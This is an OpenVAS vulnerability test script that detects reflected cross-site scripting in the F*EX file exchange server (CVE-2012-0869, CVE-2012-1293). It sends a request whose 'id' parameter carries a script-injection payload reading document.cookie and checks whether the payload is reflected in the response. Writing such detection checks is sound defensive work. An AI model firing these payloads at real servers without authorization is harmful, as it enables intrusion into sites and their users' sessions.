###############################################################################
# OpenVAS Vulnerability Test
#
# F*EX (Frams's Fast File EXchange) Multiple XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803034");
  script_version("2020-08-24T15:18:35+0000");
  script_cve_id("CVE-2012-0869", "CVE-2012-1293");
  script_bugtraq_id(52085);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-09-27 16:41:55 +0530 (Thu, 27 Sep 2012)");
  script_name("F*EX (Frams's Fast File EXchange) Multiple XSS Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47971");
  script_xref(name:"URL", value:"http://secunia.com/advisories/48066");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2012/q1/att-441/FEX_20100208.txt");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2012/q1/att-441/FEX_20111129-2.txt");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-02/0112.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8888);
  script_mandatory_keys("fexsrv/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"Frams' Fast File EXchange versions before 20111129-2");

  script_tag(name:"insight", value:"The inputs passed via 'to', 'from' and 'id' parameter to 'fup' is not
  properly validated, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to Frams' Fast File EXchange version 20111129-2 or later.");

  script_tag(name:"summary", value:"This host is running F*EX (Frams's Fast File EXchange) and is
  prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8888);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: fexsrv" >!< banner){
  exit(0);
}

url = '/fup?id=38c66"><script>alert(document.cookie);</script>'+
      'b08f61c45c6&to=%0d&from=%0d';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\);</script>",
                   extra_check: make_list('F*EX upload<', 'F*EX server'))) {
  report = http_report_vuln_url( port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
